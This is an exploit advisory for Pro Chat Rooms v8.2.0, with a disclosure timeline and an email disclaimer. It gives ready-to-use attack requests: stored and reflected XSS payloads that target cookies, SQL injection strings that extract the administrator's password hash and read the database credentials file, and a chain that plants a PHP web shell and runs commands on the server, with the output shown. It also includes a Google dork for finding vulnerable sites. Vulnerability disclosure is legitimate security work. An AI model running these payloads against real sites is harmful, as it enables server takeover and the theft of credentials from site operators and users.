@@ -1,0 +1,157 @@
+# Exploit Title: Pro Chat Rooms v8.2.0 - Multiple Vulnerabilities
+# Google Dork: intitle:"Powered by Pro Chat Rooms"
+# Date: 5 August 2014
+# Exploit Author: Mike Manzotti @ Dionach Ltd
+# Vendor Homepage: http://prochatrooms.com
+# Software Link: http://prochatrooms.com/software.php
+# Version: v8.2.0
+# Tested on: Debian (Apache+MySQL)
+
+1) Stored XSS
+===========
+
+Text Chat Room Software of ProoChatRooms is vulnerable to Stored XSS. After registered an account, an attacker can upload a profile picture containing Javascript code as shown below:
+
+POST: http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1>
+Content-Disposition: form-data; name="uploadedfile"; filename="nopic333.jpg"
+Content-Type: image/jpeg
+
+<script>alert(document.cookie)</script>
+
+By inspecting the response, the web application returns a 32 digits value in the HTML tag "imgID" as shown below:
+
+Response:
+<input type="hidden" name="imgID" value="798ae9b06cd900b95ed5a60e02419d4b">
+
+The picture is uploaded under the directory "/profiles/uploads" and is accessible by force browsing to the 32 digits value as shown below:
+
+http://<WEBSITE>/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/798ae9b06cd900b95ed5a60e02419d4b>
+
+
+2) Reflected XSS
+=============
+
+Text Chat Room Software of ProoChatRooms is vulnerable to Reflected XSS. The parameter "edit" is not encoded:
+
+http://<WEBSITE>/prochatrooms/profiles/index.php?id=1&edit="><script>alert(document.cookie)</script><http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1&edit=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e>
+
+
+3) SQL Injection
+=============
+
+Text Chat Room Software of ProoChatRooms is vulnerable to SQL injections. Across the all source code of web application, parameterized queries are used to query the database. However, a lack of data sanitization of three parameters leaves the web application vulnerable to SQLi. The vulnerable parameters are located as shown below:
+
+prochatrooms_v8.2.0/includes/functions.php: ~2437
+$params = array(
+'password' => md5($password),
+'email' => makeSafe($email),
+'id' => $id
+);
+$query = "UPDATE prochatrooms_users
+              SET email = '".$email."',
+                    password='".md5($password)."'
+              WHERE id = '".$id."'
+              ";
+
+prochatrooms_v8.2.0/includes/functions.php: ~2449
+$query = "UPDATE prochatrooms_users
+              SET email = '".$email."'
+              WHERE id = '".$id."'
+              ";
+
+prochatrooms_v8.2.0/includes/functions.php: ~3110
+$query = "UPDATE prochatrooms_users
+              SET active = '".$offlineTime."', online = '0'
+              WHERE username = '".makeSafe($toname)."'
+              ";
+
+Note that the "makeSafe" function is defined as shown below and will protect against XSS attacks only:
+
+prochatrooms_v8.2.0/includes/functions.php: ~125
+function makeSafe($data)
+{
+      $data = htmlspecialchars($data);
+
+      return $data;
+}
+
+
+After registering an account, an attacker can exploit the SQL injection by editing the field email as shown below which will retrieve the MD5 hashed password of the administrator:
+
+POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1>
+Content-Disposition: form-data; name="profileEmail"
+
+mm@1dn.eu', email=(select adminLogin from prochatrooms_config) where id ='1';#
+
+
+The following SQL injection will retrieve the SQL connection string, which probably has clear-text database credentials.
+
+POST http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1>
+Content-Disposition: form-data; name="profileEmail"
+
+mm@1dn.eu', email=(select load_file('/var/www/prochatrooms/includes/db.php')) where id ='1';#
+
+
+
+
+4) Arbitrary File Upload
+==================
+
+It is possible to combine the Stored XSS and SQL injection vulnerabilities to upload a web shell on the server.
+
+The following request will upload a PHP web shell and the web application will return a 32 digit value.
+
+POST:  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1>
+Content-Disposition: form-data; name="uploadedfile"; filename="m.jpg"
+Content-Type: application/octet-stream
+
+<?php system($_GET[cmd]);?>
+
+Response:
+<input type="hidden" name="imgID" value="82d0635538da4eac42da25f8f95f8c45">
+
+Since the uploaded web shell is without extension it will not be executed:
+
+http://<WEBSITE>/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45>
+<?php system($_GET[cmd]);?>
+
+Image:
+[cid:image005.png@01CFB099.8E117F70]
+
+However, exploiting the SQL injection it is possible to rename the file by appending a .php extension
+
+POST  http://<WEBSITE>/prochatrooms/profiles/index.php?id=1<http://%3cWEBSITE%3e/prochatrooms/profiles/index.php?id=1>
+Content-Disposition: form-data; name="profileEmail"
+
+mm@1dn.eu' where id ='1'; SELECT load_file('/var/www/prochatrooms/profiles/uploads/82d0635538da4eac42da25f8f95f8c45') INTO OUTFILE '/var/www/prochatrooms/profiles/uploads/s.php';#
+
+Web shell:
+http://<WEBSITE>/prochatrooms/profiles/uploads/s.php?cmd=id<http://%3cWEBSITE%3e/prochatrooms/profiles/uploads/s.php?cmd=id>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Image:
+[cid:image006.png@01CFB099.8E117F70]
+
+
+Timeline
+========
+19/07/2014: Vendor informed via email
+04/08/2014: Vendor informed via email
+05/08/2014: Public Disclosure
+
+Kind regards,
+Mike
+
+______________________________________________________________________
+
+Disclaimer: This e-mail and any attachments are confidential.
+
+It may contain privileged information and is intended for the named
+addressee(s) only. It must not be distributed without Dionach Ltd consent.
+If you are not the intended recipient, please notify the sender immediately and destroy this e-mail. 
+
+Any unauthorised copying, disclosure or distribution of the material in this e-mail is strictly forbidden. Unless expressly stated, opinions in this e-mail are those of the individual sender, and not of Dionach Ltd.
+
+Dionach Ltd, Greenford House, London Road, Wheatley, Oxford OX33 1JH Company Registration No. 03908168, VAT No. GB750661242
+
+______________________________________________________________________
